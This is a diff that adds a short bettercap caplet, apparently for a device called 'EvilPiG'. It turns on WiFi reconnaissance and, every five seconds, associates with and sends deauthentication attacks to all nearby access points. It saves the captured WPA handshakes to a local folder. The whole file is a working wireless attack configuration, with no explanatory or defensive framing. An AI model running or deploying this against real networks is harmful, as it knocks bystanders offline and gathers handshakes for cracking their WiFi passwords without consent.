@@ -1,0 +1,6 @@
+set ticker.period 5
+set wifi.handshakes.aggregate false
+set wifi.handshakes.file /opt/EvilPiG/hs/
+set ticker.commands "wifi.assoc all"; "wifi.deauth all"
+ticker on
+wifi.recon on
